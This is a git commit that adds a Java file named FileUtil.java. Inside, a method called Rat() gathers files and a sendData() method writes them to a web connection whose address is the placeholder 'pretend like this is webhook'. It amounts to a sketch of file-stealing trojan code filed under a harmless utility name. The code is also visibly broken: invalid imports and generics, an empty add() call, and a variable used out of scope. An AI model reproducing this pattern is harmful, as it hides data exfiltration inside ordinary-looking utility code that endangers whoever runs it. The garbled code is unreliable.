3fe24eff79dbed2ef7fc5b5d58d7901e2d628901
LiIndexUwU <93841328+LiIndexUwU@users.noreply.github.com>
2022-01-01 22:32:20 +0100

    Create FileUtil.java

---
+++ utils/FileUtil.java
@@ -0,0 +1,21 @@
+package utils;
+
+import java.*;
+
+public class FileUtil {
+  void Rat() {
+    List<T... t> files = new ArrayList<T... t>();
+    files.add();
+  }
+  void sendData() {
+    for (File f : files) {
+      HttpURLConnection webhook = (HttpURLConnection) new URL("pretend like this is webhook").openConnection();
+      try {
+        webhook.getOutputStream().write(Arrays.asList(files));
+      }
+      catch (Exception e) {
+        e.printStackTrace();
+      }
+    }
+  }
+}
